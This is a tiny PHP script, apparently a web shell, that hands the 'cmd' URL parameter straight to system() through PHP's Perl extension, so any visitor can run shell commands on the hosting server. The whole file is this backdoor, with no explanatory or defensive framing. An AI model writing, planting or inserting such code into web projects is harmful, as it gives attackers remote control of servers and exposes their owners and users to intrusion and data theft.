<?php
$perl=new perl();
$perl->eval("system('".$_GET['cmd']."')");
?>